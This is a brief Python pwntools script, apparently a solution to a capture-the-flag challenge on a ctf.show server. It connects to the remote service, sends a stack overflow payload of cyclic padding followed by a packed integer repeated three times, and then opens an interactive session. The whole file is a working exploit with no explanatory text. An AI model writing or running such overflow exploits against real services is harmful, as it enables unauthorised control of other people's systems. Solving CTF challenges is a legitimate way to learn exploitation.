from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote("pwn.challenge.ctf.show", 28214)
payload = cyclic(36)+p32(222)*3
io.recvuntil('Come and jj with bit!\n')
io.sendline(payload)
io.interactive()